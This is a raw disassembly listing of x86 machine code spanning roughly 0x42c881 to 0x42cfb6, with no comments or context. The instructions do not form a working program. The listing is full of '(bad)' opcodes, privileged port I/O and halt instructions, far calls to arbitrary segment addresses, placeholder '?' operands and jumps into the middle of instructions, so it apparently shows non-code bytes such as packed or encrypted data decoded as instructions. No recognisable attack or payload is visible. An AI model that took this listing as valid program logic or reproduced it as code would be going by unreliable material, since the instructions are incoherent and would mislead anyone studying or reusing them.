  42c881:	jns    0x42c880
  42c883:	and    dh,BYTE PTR [ecx+0x63f2a7ab]
  42c889:	mov    esi,0x69346f05
  42c88e:	stc    
  42c88f:	adc    DWORD PTR [eax+0x33a7eb07],0x3e
  42c896:	push   cs
  42c897:	dec    ebx
  42c898:	inc    ebx
  42c899:	or     al,0x9a
  42c89b:	push   esp
  42c89c:	loope  0x42c836
  42c89e:	out    dx,eax
  42c89f:	(bad)  
  42c8a0:	xchg   ecx,eax
  42c8a1:	push   ss
  42c8a2:	or     esp,DWORD PTR [edi+0x5a89ba71]
  42c8a8:	in     eax,0x6
  42c8aa:	or     dl,al
  42c8ac:	mov    dl,0xc7
  42c8ae:	cmp    al,0x9e
  42c8b0:	outs   dx,BYTE PTR ds:[esi]
  42c8b1:	mov    bl,0x92
  42c8b3:	cmp    eax,0x7ca80b9a
  42c8b8:	inc    edx
  42c8b9:	lea    esp,gs:[edi-0x4d]
  42c8bd:	mov    ds:0xe0086e9d,eax
  42c8c2:	ret    0xb254
  42c8c5:	inc    ebx
  42c8c6:	ret    
  42c8c7:	xchg   ebx,eax
  42c8c8:	call   0xda5b:0xb5aab805
  42c8cf:	mov    edi,DWORD PTR [ebx+0x31]
  42c8d2:	inc    edx
  42c8d3:	out    dx,al
  42c8d4:	mov    dl,0x78
  42c8d6:	xchg   BYTE PTR [eax-0x159e44f6],dl
  42c8dc:	or     eax,0x32aabd37
  42c8e1:	xor    al,0x9f
  42c8e3:	shl    ecx,0xce
  42c8e6:	cmp    DWORD PTR [esi-0x44],esi
  42c8e9:	dec    esp
  42c8ea:	pop    es
  42c8eb:	out    dx,eax
  42c8ec:	adc    al,0xb
  42c8ee:	daa    
  42c8ef:	rcr    DWORD PTR [eax+0x6da704c8],cl
  42c8f5:	sar    BYTE PTR [ebp+0x7f],1
  42c8f8:	(bad)  
  42c8f9:	int3   
  42c8fa:	push   esi
  42c8fb:	out    0xb2,al
  42c8fd:	xor    al,0xd8
  42c8ff:	int3   
  42c900:	jo     0x42c906
  42c902:	jbe    0x42c8be
  42c904:	imul   ecx,DWORD PTR [ebx],0xfffffff4
  42c907:	adc    bh,BYTE PTR [edi+0x37bf6e10]
  42c90d:	mov    ebp,0xb993cd9a
  42c912:	sbb    bl,cl
  42c914:	loopne 0x42c8a9
  42c916:	int3   
  42c917:	mov    eax,0xa75cb0a6
  42c91c:	jne    0x42c916
  42c91e:	aam    0x63
  42c920:	jecxz  0x42c955
  42c922:	xchg   ebp,eax
  42c923:	in     al,dx
  42c924:	lock enter 0x7ed,0xc9
  42c929:	fwait
  42c92a:	add    bl,BYTE PTR [edx+0x391a0b4d]
  42c930:	inc    ebp
  42c931:	shl    DWORD PTR [edx],1
  42c933:	xchg   ecx,eax
  42c934:	jb     0x42c9b4
  42c936:	call   0xd893:0x69cf89ba
  42c93d:	xor    DWORD PTR [edx-0x74a49060],edi
  42c943:	div    ch
  42c945:	sbb    ebx,DWORD PTR [esi+ecx*4]
  42c948:	jae    0x42c8ce
  42c94a:	call   0x328d:0x5fac26ca
  42c951:	fidiv  DWORD PTR [esi-0x67]
  42c954:	sub    esp,DWORD PTR [ebx+ebx*1]
  42c957:	adc    eax,0x676088c3
  42c95c:	push   eax
  42c95d:	enter  0x1132,0x34
  42c961:	ins    DWORD PTR es:[edi],dx
  42c962:	call   0x73ed:0xc133bf95
  42c969:	aad    0xf1
  42c96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c96c:	xchg   esi,eax
  42c96d:	test   BYTE PTR [edi],dh
  42c96f:	mov    edx,DWORD PTR [ecx+0x657dfdc]
  42c975:	cdq    
  42c976:	call   0x9d5b:0x5a18d0a5
  42c97d:	pop    eax
  42c97e:	jmp    0x42c959
  42c980:	and    eax,0xb2dd9330
  42c985:	and    dl,BYTE PTR [ebx+ebp*8+0x7d]
  42c989:	jmp    DWORD PTR [esi]
  42c98b:	adc    BYTE PTR [edx-0x4243721a],dh
  42c991:	pop    ecx
  42c992:	int    0x2a
  42c994:	(bad)  
  42c995:	or     ebp,eax
  42c997:	add    DWORD PTR [edi-0x7b],0xffffff9c
  42c99b:	xor    al,0x1b
  42c99d:	push   cs
  42c99e:	call   0xdb1c:0xfa166d1b
  42c9a5:	mov    dh,cl
  42c9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9a8:	stc    
  42c9a9:	repz data16 inc BYTE PTR [esi]
  42c9ad:	pushf  
  42c9ae:	sub    ah,BYTE PTR [ebx+0x4a9942cc]
  42c9b4:	xchg   DWORD PTR [eax],esi
  42c9b6:	imul   edx,DWORD PTR es:[ecx],0xf60f159b
  42c9bd:	or     ebx,DWORD PTR [ecx-0x6f]
  42c9c0:	dec    edi
  42c9c1:	fidiv  WORD PTR [ebx-0x64c7586a]
  42c9c7:	and    al,0xe1
  42c9c9:	xor    eax,0x116097ff
  42c9ce:	inc    esi
  42c9cf:	mov    ds:0x9b0b0809,al
  42c9d4:	or     al,0x26
  42c9d6:	out    dx,eax
  42c9d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9d8:	jb     0x42c9f9
  42c9da:	and    ch,al
  42c9dc:	mov    dl,0xe8
  42c9de:	pushw  ds
  42c9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9e1:	retf   0xc0c1
  42c9e4:	or     esp,DWORD PTR es:0x545babab
  42c9eb:	xor    edi,edi
  42c9ed:	sbb    bl,BYTE PTR [edx+0x46bce0ff]
  42c9f3:	pop    edx
  42c9f4:	mov    ch,0xcd
  42c9f6:	fcomp  QWORD PTR [ebp+0x2]
  42c9f9:	add    al,0xe9
  42c9fb:	popf   
  42c9fc:	out    0xdb,eax
  42c9fe:	clc    
  42c9ff:	push   eax
  42ca00:	mov    dh,0x4c
  42ca02:	lds    esp,FWORD PTR [edi-0x575a06fb]
  42ca08:	pop    ebp
  42ca09:	xor    ebx,DWORD PTR [esi+eax*8-0x72]
  42ca0d:	mov    bh,0x9a
  42ca0f:	sub    eax,0xb9f62e32
  42ca14:	ror    BYTE PTR [eax],0xb4
  42ca17:	xchg   ebx,eax
  42ca18:	adc    ax,0x4b9a
  42ca1c:	hlt    
  42ca1d:	test   DWORD PTR [edx+0x40],0xbbe530c8
  42ca24:	cmp    eax,0xaf1b2f3b
  42ca29:	or     bl,bl
  42ca2b:	jmp    0xa464fcbe
  42ca30:	mov    edx,0x51cfb2df
  42ca35:	test   al,0x9a
  42ca37:	adc    bh,0x16
  42ca3a:	inc    edi
  42ca3b:	imul   esp,DWORD PTR [edx+0x78edfd00],0xffffffeb
  42ca42:	idiv   BYTE PTR [edx+esi*4-0x7b]
  42ca46:	dec    ebp
  42ca47:	and    ebx,ecx
  42ca49:	xchg   ecx,eax
  42ca4a:	fadd   QWORD PTR ds:0x34950b55
  42ca50:	(bad)  
  42ca51:	aam    0xcc
  42ca53:	cmp    BYTE PTR ds:0x2569a31,cl
  42ca59:	jl     0x42ca7d
  42ca5b:	nop
  42ca5c:	jo     0x42ca4f
  42ca5e:	and    DWORD PTR [esp+esi*4+0x5fecea47],esp
  42ca65:	jne    0x42caa1
  42ca67:	outs   dx,BYTE PTR ds:[esi]
  42ca68:	cli    
  42ca69:	lock mov dh,0x79
  42ca6c:	aaa    
  42ca6d:	and    ebx,DWORD PTR [edx+0x377ce5d3]
  42ca73:	xchg   esp,eax
  42ca74:	adc    edi,esp
  42ca76:	pop    ebp
  42ca77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca78:	pusha  
  42ca79:	push   edx
  42ca7a:	pop    eax
  42ca7b:	add    BYTE PTR [esi-0x4d13be7d],ah
  42ca81:	data16 das 
  42ca83:	fbld   TBYTE PTR [ebp-0x31]
  42ca86:	(bad)  
  42ca87:	std    
  42ca88:	pop    eax
  42ca89:	or     ebx,DWORD PTR [esi+0x442f0ea1]
  42ca8f:	(bad)  
  42ca90:	ror    DWORD PTR [edx-0x66],1
  42ca93:	pop    esi
  42ca94:	xchg   ebx,eax
  42ca95:	pop    ebx
  42ca96:	(bad)  
  42ca97:	clc    
  42ca98:	stc    
  42ca99:	mov    esi,0xae8c9fc2
  42ca9e:	sbb    dl,ch
  42caa0:	ror    edx,0x64
  42caa3:	mov    DWORD PTR [ebx+0x1ed09ab1],ebp
  42caa9:	ror    DWORD PTR [edx],1
  42caab:	jb     0x42caae
  42caad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42caae:	push   ecx
  42caaf:	aam    0x1b
  42cab1:	sbb    al,0x54
  42cab3:	mov    WORD PTR [ebp+0x4],es
  42cab6:	push   edx
  42cab7:	mov    esi,0x6db65872
  42cabc:	call   0xda19:0xdfac8724
  42cac3:	dec    esi
  42cac4:	xor    BYTE PTR [esi+eax*8],dl
  42cac7:	sub    ebp,DWORD PTR [edi+0x6533d804]
  42cacd:	jne    0x42cb29
  42cacf:	mov    esp,0x73c4a067
  42cad4:	(bad)  
  42cad5:	aam    0xed
  42cad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cad8:	adc    eax,0x498a16bd
  42cadd:	jmp    0x42cb06
  42cadf:	aas    
  42cae0:	mov    bl,0xb
  42cae2:	cdq    
  42cae3:	pop    edx
  42cae4:	cmp    ch,BYTE PTR [edi-0x1d]
  42cae7:	push   edx
  42cae8:	call   0xd57565c5
  42caed:	cdq    
  42caee:	(bad)  
  42caef:	call   0x3f600b07
  42caf4:	or     cl,BYTE PTR [ebx]
  42caf6:	inc    esp
  42caf7:	mov    bl,0xc4
  42caf9:	add    DWORD PTR [ecx+eiz*1-0x705ff94b],0x7d
  42cb01:	mov    esi,DWORD PTR [esi-0xceb6701]
  42cb07:	pop    ds
  42cb08:	sub    al,0xe7
  42cb0a:	aaa    
  42cb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb0c:	repnz or DWORD PTR [ecx+0x5eb6c47a],esi
  42cb13:	inc    edi
  42cb14:	call   0x1b2c65e3
  42cb19:	out    0xb8,al
  42cb1b:	sub    edi,ebp
  42cb1d:	in     al,0x1
  42cb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb20:	cmp    DWORD PTR [edx-0x3c],edi
  42cb23:	stos   DWORD PTR es:[edi],eax
  42cb24:	sar    DWORD PTR [edx],cl
  42cb26:	add    ch,BYTE PTR [esi]
  42cb28:	mov    dl,0x81
  42cb2a:	mov    bh,0x4e
  42cb2c:	mov    dh,0xb0
  42cb2e:	aaa    
  42cb2f:	not    DWORD PTR [ebx+0xb]
  42cb32:	inc    eax
  42cb33:	addr16 icebp 
  42cb35:	ins    BYTE PTR es:[edi],dx
  42cb36:	ficom  WORD PTR [ebx]
  42cb38:	xor    cl,BYTE PTR [edx+ebx*4]
  42cb3b:	add    bh,BYTE PTR [ecx]
  42cb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb3e:	push   ss
  42cb3f:	pop    ebx
  42cb40:	adc    eax,0x35a700c3
  42cb45:	inc    ebx
  42cb46:	mov    ds:0x3efd780f,al
  42cb4b:	xor    BYTE PTR [edx+0x537079a],al
  42cb51:	aam    0xb8
  42cb53:	fwait
  42cb54:	push   edx
  42cb55:	push   edi
  42cb56:	pop    es
  42cb57:	and    BYTE PTR gs:[ebx-0x4a],cl
  42cb5b:	stos   DWORD PTR es:[edi],eax
  42cb5c:	out    0xb7,al
  42cb5e:	(bad)  
  42cb60:	lods   eax,DWORD PTR ds:[esi]
  42cb61:	and    al,0xec
  42cb63:	jnp    0x42cb97
  42cb65:	mov    ebp,0x8d78460e
  42cb6a:	jp     0x42cb13
  42cb6c:	adc    DWORD PTR ds:0x926c8461,ecx
  42cb72:	push   ebp
  42cb73:	sub    dh,BYTE PTR [edx+0x104130b1]
  42cb79:	sahf   
  42cb7a:	lods   eax,DWORD PTR ds:[esi]
  42cb7b:	push   ecx
  42cb7c:	ret    0xfc12
  42cb7f:	mov    ah,dl
  42cb81:	pop    es
  42cb82:	sub    bl,BYTE PTR [edi-0x11]
  42cb85:	jno    0x42cb1c
  42cb87:	add    esi,ebp
  42cb89:	mov    esi,0x216b279c
  42cb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb8f:	sar    edx,0xb
  42cb92:	(bad)  [edi]
  42cb94:	cmp    eax,0xa9d3945
  42cb99:	call   0x720dd33
  42cb9e:	jb     0x42cbc7
  42cba0:	or     al,0xf7
  42cba2:	enter  0x2252,0x2
  42cba6:	aad    0xab
  42cba8:	outs   dx,DWORD PTR ds:[esi]
  42cba9:	sbb    dh,BYTE PTR cs:[esi+0x7074c302]
  42cbb0:	mov    bl,0xa
  42cbb2:	jle    0x42cc0c
  42cbb4:	das    
  42cbb5:	mov    esi,0xa8622806
  42cbba:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42cbbc:	jmp    DWORD PTR fs:[ebx+0x459f1a24]
  42cbc3:	retf   
  42cbc4:	mov    dl,0xb9
  42cbc6:	push   0x8b769bd8
  42cbcb:	ins    BYTE PTR es:[edi],dx
  42cbcc:	mov    DWORD PTR [ebp+0x1d],esi
  42cbcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbd0:	mov    esp,0x7be44e0f
  42cbd5:	int3   
  42cbd6:	add    BYTE PTR [edi-0x5d54c377],0xa
  42cbdd:	sbb    edi,DWORD PTR [ecx-0x2a]
  42cbe0:	jb     0x42cbbd
  42cbe2:	sub    al,0xbb
  42cbe4:	cli    
  42cbe5:	or     ebx,DWORD PTR [ecx+ebp*8+0x13b2fa19]
  42cbec:	inc    edi
  42cbed:	pop    esi
  42cbee:	call   0x46e0:0xb3938d51
  42cbf5:	xchg   edx,eax
  42cbf6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42cbf8:	inc    edx
  42cbf9:	cmp    DWORD PTR [edi],esp
  42cbfb:	push   ss
  42cbfc:	scas   al,BYTE PTR es:[edi]
  42cbfd:	out    0xe3,al
  42cbff:	loop   0x42cbef
  42cc01:	ins    DWORD PTR es:[di],dx
  42cc03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc04:	cli    
  42cc05:	dec    edi
  42cc06:	sbb    cl,BYTE PTR [edx-0x4c1f64a4]
  42cc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc0d:	or     al,0x35
  42cc0f:	lahf   
  42cc10:	in     al,dx
  42cc11:	adc    DWORD PTR [edi+eiz*8+0x3d],0xc
  42cc16:	inc    edi
  42cc17:	xchg   esi,eax
  42cc18:	mov    cl,0xbe
  42cc1a:	jo     0x42cc6d
  42cc1c:	push   esp
  42cc1d:	mov    cl,BYTE PTR [eax]
  42cc1f:	pop    es
  42cc20:	(bad)  [edi]
  42cc22:	pop    edx
  42cc23:	pop    es
  42cc24:	and    eax,0xdd81f64c
  42cc29:	xchg   esp,eax
  42cc2a:	adc    ah,BYTE PTR [esi-0x2a2e9116]
  42cc30:	xchg   ebp,eax
  42cc31:	jecxz  0x42cbc7
  42cc33:	ins    DWORD PTR es:[edi],dx
  42cc34:	mov    dl,0x6b
  42cc36:	jnp    0x42cbc6
  42cc38:	mov    al,0x23
  42cc3a:	repz test BYTE PTR [eax+0x14de3f0b],0xf3
  42cc42:	adc    BYTE PTR [edi+0x3f9a2f0a],0xbe
  42cc49:	sub    al,cl
  42cc4b:	dec    eax
  42cc4c:	call   0x4fea4742
  42cc51:	test   DWORD PTR [edi+0x70c558d],ebp
  42cc57:	mov    esi,0x4b2c36b2
  42cc5c:	jle    0x42ccc3
  42cc5e:	adc    ecx,ebx
  42cc60:	test   BYTE PTR [ebx],0xb2
  42cc63:	repz and BYTE PTR es:[edi],0x98
  42cc68:	inc    edx
  42cc69:	scas   al,BYTE PTR es:[edi]
  42cc6a:	jb     0x42cc14
  42cc6c:	mov    ebp,0x8c0e1043
  42cc71:	sub    edx,DWORD PTR [edi]
  42cc73:	mul    DWORD PTR [ebp-0x2e]
  42cc76:	aad    0xa7
  42cc78:	xor    esp,DWORD PTR [ebx+0x3]
  42cc7b:	mov    ch,0x9f
  42cc7d:	(bad)  
  42cc7f:	das    
  42cc80:	mov    dl,0xb3
  42cc82:	sar    DWORD PTR [eax-0x716bf835],1
  42cc88:	sub    cl,BYTE PTR [ebx]
  42cc8a:	pop    ecx
  42cc8c:	push   0x54
  42cc8e:	mov    eax,ds:0x9a7f608b
  42cc93:	push   ebx
  42cc94:	cmp    eax,ebx
  42cc96:	test   dh,ch
  42cc98:	jne    0x42cc33
  42cc9a:	fs (bad) 
  42cc9c:	scas   eax,DWORD PTR es:[edi]
  42cc9d:	cmp    eax,0xe7b53d4b
  42cca2:	cdq    
  42cca3:	sub    eax,DWORD PTR [ecx-0x36]
  42cca6:	test   eax,0xbed33017
  42ccab:	outs   dx,DWORD PTR ds:[esi]
  42ccac:	jmp    0xdcc8:0x3d311d0b
  42ccb3:	inc    eax
  42ccb4:	lock dec ebx
  42ccb6:	call   0x37c7:0x86a1128c
  42ccbd:	retf   0xa6bc
  42ccc0:	stos   BYTE PTR es:[edi],al
  42ccc1:	sti    
  42ccc2:	or     al,0xd0
  42ccc4:	out    0xac,al
  42ccc6:	gs dec ebx
  42ccc8:	cs aam 0x9a
  42cccb:	or     BYTE PTR [edi-0x4f],0xdf
  42cccf:	out    0x75,al
  42ccd1:	xchg   BYTE PTR [esi-0x59],ah
  42ccd4:	mov    WORD PTR [ebx],?
  42ccd6:	pop    ebx
  42ccd7:	popa   
  42ccd8:	and    DWORD PTR [ebp+0x75],edi
  42ccdb:	or     dh,BYTE PTR [edx+0x1211f845]
  42cce1:	mov    dh,BYTE PTR [eax-0x28]
  42cce4:	retf   0x350b
  42cce7:	pop    ds
  42cce8:	xchg   edi,eax
  42cce9:	pop    edx
  42ccea:	aad    0xcd
  42ccec:	cmp    ecx,DWORD PTR [ecx-0x7a]
  42ccef:	mov    ch,0x99
  42ccf1:	call   0x2800:0x243f615a
  42ccf8:	inc    ebp
  42ccf9:	or     al,0x66
  42ccfb:	je     0x42cc99
  42ccfd:	and    bh,BYTE PTR [ebx+0x27]
  42cd00:	add    edi,DWORD PTR [edi-0x304dcb84]
  42cd06:	ret    
  42cd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd08:	sub    BYTE PTR [esi],0x36
  42cd0b:	sub    DWORD PTR [edi+0xb],edx
  42cd0e:	not    DWORD PTR [edi+0x2719210e]
  42cd14:	rcl    DWORD PTR [ecx-0x6a4af566],1
  42cd1a:	clc    
  42cd1b:	push   edi
  42cd1c:	dec    esp
  42cd1d:	sbb    eax,0x8ce825a0
  42cd23:	cmc    
  42cd24:	hlt    
  42cd25:	dec    ebx
  42cd26:	jae    0x42cd01
  42cd28:	bound  eax,QWORD PTR [esi]
  42cd2a:	js     0x42cd04
  42cd2c:	mov    dl,0x7a
  42cd2e:	(bad)  
  42cd2f:	adc    al,0x4a
  42cd31:	pop    edi
  42cd32:	pop    ecx
  42cd33:	out    dx,al
  42cd34:	cmp    ch,bh
  42cd36:	shl    DWORD PTR [eax-0x581e5196],0x3c
  42cd3d:	push   DWORD PTR [eax+esi*2]
  42cd40:	sbb    esp,DWORD PTR [ecx-0x49d7f066]
  42cd46:	push   esi
  42cd47:	ds aam 0xb8
  42cd4a:	adc    ah,BYTE PTR [edi+0x7486d3cc]
  42cd50:	xchg   ebp,eax
  42cd51:	sbb    edi,esi
  42cd53:	push   ds
  42cd54:	mov    ah,BYTE PTR [esi]
  42cd56:	sub    eax,0x5a2310b9
  42cd5b:	pop    ebx
  42cd5c:	or     al,0x4a
  42cd5e:	repnz fsub DWORD PTR [eax-0x1afd34f5]
  42cd65:	jae    0x42cd11
  42cd67:	cmp    ecx,eax
  42cd69:	sbb    BYTE PTR [edx+0x3a147875],bl
  42cd6f:	adc    dl,BYTE PTR [esi]
  42cd71:	outs   dx,DWORD PTR ds:[esi]
  42cd72:	push   cs
  42cd73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd74:	imul   ebp,ebx,0xb6e772be
  42cd7a:	call   0x935a8005
  42cd7f:	(bad)  
  42cd80:	pop    edi
  42cd81:	add    dh,cl
  42cd83:	xor    DWORD PTR [ecx+0x2b24330b],edx
  42cd89:	push   esp
  42cd8a:	and    edx,ebx
  42cd8c:	dec    eax
  42cd8d:	pop    ds
  42cd8e:	call   0x109f:0x374bdd76
  42cd95:	out    dx,al
  42cd96:	stos   BYTE PTR es:[edi],al
  42cd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd98:	push   edx
  42cd99:	pop    edx
  42cd9a:	sahf   
  42cd9b:	mov    esp,0x253fc215
  42cda0:	mov    dl,0xa4
  42cda2:	mov    BYTE PTR [ecx+0x4268a73a],al
  42cda8:	ror    BYTE PTR [ebx],cl
  42cdaa:	pushf  
  42cdab:	inc    ecx
  42cdac:	hlt    
  42cdad:	pop    ds
  42cdae:	xchg   bl,dh
  42cdb0:	jp     0x42cdb4
  42cdb2:	call   0x6cd1:0xa7992925
  42cdb9:	int    0xa
  42cdbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cdbc:	mov    al,0xa7
  42cdbe:	cdq    
  42cdbf:	sub    al,0xdf
  42cdc1:	xor    esp,DWORD PTR [edi-0x50]
  42cdc4:	mov    ch,0x1a
  42cdc6:	adc    al,0xc4
  42cdc8:	out    dx,al
  42cdc9:	aas    
  42cdca:	jp     0x42cd84
  42cdcc:	lods   al,BYTE PTR ds:[esi]
  42cdcd:	push   ebp
  42cdce:	jmp    0xbee2:0x775b06a7
  42cdd5:	and    al,0x1d
  42cdd7:	adc    BYTE PTR [ebx-0x4f5f0a93],bh
  42cddd:	test   DWORD PTR [esp+eiz*4+0x349cc6a4],edi
  42cde4:	repz icebp 
  42cde6:	sahf   
  42cde7:	daa    
  42cde8:	aas    
  42cde9:	mov    ch,0x22
  42cdeb:	sub    al,0x31
  42cded:	add    eax,0x7602ffd2
  42cdf2:	fidivr DWORD PTR [edi+0x7d570935]
  42cdf8:	mov    dl,0xc0
  42cdfa:	push   esp
  42cdfb:	xor    BYTE PTR [esi],bl
  42cdfd:	mov    dl,0x19
  42cdff:	xchg   esp,eax
  42ce00:	stc    
  42ce01:	adc    al,0xe5
  42ce03:	icebp  
  42ce04:	fimul  WORD PTR [ebx]
  42ce06:	jns    0x42cde2
  42ce08:	sbb    al,BYTE PTR [esi-0x462d75ec]
  42ce0e:	loop   0x42cdaa
  42ce10:	es xchg edx,eax
  42ce12:	inc    ecx
  42ce13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce14:	mov    esp,0x5ef8c1a6
  42ce19:	mov    edx,0x1cdde68
  42ce1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce1f:	jge    0x42cdc8
  42ce21:	add    ch,BYTE PTR [edi]
  42ce23:	cwde   
  42ce24:	ror    DWORD PTR [ebx],1
  42ce26:	jecxz  0x42ce81
  42ce28:	adc    eax,0x77a7607e
  42ce2d:	loopne 0x42ce98
  42ce2f:	and    BYTE PTR [esi],al
  42ce31:	mov    ecx,0x31fa2759
  42ce36:	pop    ds
  42ce37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce38:	enter  0xf79f,0x6a
  42ce3c:	and    eax,0x31a778f0
  42ce41:	sub    eax,0x6b270fdf
  42ce46:	pop    es
  42ce47:	aam    0xb2
  42ce49:	mov    ebp,ecx
  42ce4b:	loopne 0x42cec8
  42ce4d:	outs   dx,DWORD PTR ds:[esi]
  42ce4e:	lods   al,BYTE PTR ds:[esi]
  42ce4f:	or     eax,0x2ed70b9a
  42ce54:	into   
  42ce55:	xchg   bh,ah
  42ce57:	es pusha 
  42ce59:	pushf  
  42ce5a:	cdq    
  42ce5b:	add    bh,BYTE PTR [edi+eiz*2-0x4737f7d]
  42ce62:	lods   al,BYTE PTR ds:[esi]
  42ce63:	pop    esi
  42ce64:	and    al,0xc
  42ce66:	in     al,dx
  42ce67:	sub    BYTE PTR [ebp+ebx*8+0x740df7fb],ah
  42ce6e:	in     eax,dx
  42ce6f:	std    
  42ce70:	mov    dl,0x4a
  42ce72:	push   ebx
  42ce73:	test   BYTE PTR [esi-0x2d79324a],bh
  42ce79:	or     esi,DWORD PTR [edi-0x5811ecbd]
  42ce7f:	or     eax,0x8e9a446c
  42ce84:	int3   
  42ce85:	cs xor ah,bh
  42ce88:	and    ebx,DWORD PTR [edx]
  42ce8a:	neg    DWORD PTR [ebx+0x2]
  42ce8d:	or     edi,esp
  42ce8f:	fidivr DWORD PTR [ecx]
  42ce91:	or     eax,ebp
  42ce93:	in     al,0x5e
  42ce95:	(bad)  
  42ce96:	call   0xecd8:0x24a16e3b
  42ce9d:	leave  
  42ce9e:	pop    ecx
  42ce9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cea0:	xchg   ecx,eax
  42cea1:	retf   0xe22
  42cea4:	(bad)  
  42cea5:	xor    eax,DWORD PTR [ebx]
  42cea7:	jle    0x42ce5b
  42cea9:	add    dh,bl
  42ceab:	dec    ebp
  42ceac:	adc    ch,ch
  42ceae:	pop    esi
  42ceaf:	xchg   esi,eax
  42ceb0:	fisttp QWORD PTR [ebx]
  42ceb2:	hlt    
  42ceb3:	sub    eax,0x1330d82
  42ceb8:	div    BYTE PTR [ebx]
  42ceba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cebb:	pusha  
  42cebc:	out    0xb,al
  42cebe:	adc    ebp,DWORD PTR [edi]
  42cec0:	popf   
  42cec1:	xchg   esi,eax
  42cec2:	or     DWORD PTR [ecx],edx
  42cec4:	push   edx
  42cec5:	or     ebp,DWORD PTR [edx]
  42cec7:	push   ebx
  42cec8:	and    eax,0xaed6a88e
  42cecd:	mov    esi,0xbf3d0593
  42ced2:	fisub  DWORD PTR [edi+0x10a9f443]
  42ced8:	sub    ecx,DWORD PTR [esi*2+0x6fd64225]
  42cedf:	aaa    
  42cee0:	dec    esp
  42cee1:	ror    BYTE PTR [esi+0x1a],cl
  42cee4:	lds    esi,FWORD PTR [ebx]
  42cee6:	call   0x6724:0x73f0c421
  42ceed:	mov    al,0xbb
  42ceef:	lahf   
  42cef0:	and    bl,bl
  42cef2:	ss jne 0x42cef7
  42cef5:	or     esi,DWORD PTR [eax+0x80a137]
  42cefb:	mov    eax,ds:0xc0ec41b2
  42cf00:	mov    ch,BYTE PTR [ebx+0x73]
  42cf03:	push   ebx
  42cf04:	xor    cl,BYTE PTR [eax]
  42cf06:	push   eax
  42cf07:	(bad)  
  42cf08:	jns    0x42cedc
  42cf0a:	jecxz  0x42cf54
  42cf0c:	inc    edx
  42cf0d:	js     0x42cf2f
  42cf0f:	push   0xfb47a9bd
  42cf14:	and    al,0x8b
  42cf16:	gs and dl,ah
  42cf19:	xchg   edi,eax
  42cf1a:	test   eax,0xbe0b9949
  42cf1f:	or     bh,BYTE PTR ds:[ebx]
  42cf22:	int3   
  42cf23:	mov    bh,BYTE PTR ds:0xb32a9a7e
  42cf29:	sahf   
  42cf2a:	aaa    
  42cf2b:	ins    DWORD PTR es:[edi],dx
  42cf2c:	mov    DWORD PTR [ecx-0x303d5bc7],ebp
  42cf32:	or     edi,ebp
  42cf34:	jl     0x42cf6d
  42cf36:	cmp    esi,edx
  42cf38:	outs   dx,BYTE PTR ds:[esi]
  42cf39:	retf   
  42cf3a:	pop    edx
  42cf3b:	popa   
  42cf3c:	rcpps  xmm2,XMMWORD PTR [esi+eax*8+0x6793b868]
  42cf44:	pop    es
  42cf45:	cmp    eax,0xa7f2ee7
  42cf4a:	test   DWORD PTR [ebx-0x5438772b],ecx
  42cf50:	loope  0x42cf21
  42cf52:	jp     0x42cfab
  42cf54:	lods   eax,DWORD PTR ds:[esi]
  42cf55:	sar    bh,cl
  42cf57:	scas   eax,DWORD PTR es:[edi]
  42cf58:	mov    esp,0x20a75fc7
  42cf5d:	int3   
  42cf5e:	dec    ebx
  42cf5f:	test   BYTE PTR [esi],dh
  42cf61:	or     esp,DWORD PTR [ebp+0x5905a73]
  42cf67:	iret   
  42cf68:	sbb    eax,0xd68c9d6c
  42cf6d:	popf   
  42cf6e:	es cmp eax,0x2649a520
  42cf74:	js     0x42cf00
  42cf76:	pop    eax
  42cf77:	push   ss
  42cf78:	xchg   ebx,eax
  42cf79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf7a:	inc    edx
  42cf7b:	loop   0x42cf0a
  42cf7d:	or     eax,DWORD PTR [ebx+0x3a]
  42cf80:	mov    ebp,0xe98acb4b
  42cf85:	sub    al,0x9e
  42cf87:	das    
  42cf88:	push   edi
  42cf89:	inc    ecx
  42cf8a:	push   es
  42cf8b:	xor    BYTE PTR [ebp-0x24],dh
  42cf8e:	sbb    bh,ch
  42cf90:	add    al,0xe4
  42cf92:	in     eax,dx
  42cf93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf94:	in     al,dx
  42cf95:	shl    bl,1
  42cf97:	xchg   DWORD PTR [eax],edi
  42cf99:	clc    
  42cf9a:	adc    al,BYTE PTR [esi-0x77]
  42cf9d:	fsub   QWORD PTR [edi]
  42cfa0:	iret   
  42cfa1:	int3   
  42cfa2:	nop
  42cfa3:	(bad)  
  42cfa4:	enter  0xf68a,0xa7
  42cfa8:	inc    esp
  42cfa9:	pop    edx
  42cfaa:	test   DWORD PTR [ecx+0x5f26ade7],eax
  42cfb0:	mov    ?,esp
  42cfb2:	(bad)  
  42cfb3:	cmp    esp,DWORD PTR [ebx]
  42cfb5:	xchg   ebp,eax
  42cfb6:	call   0x68d8:0x5dcaf0a3
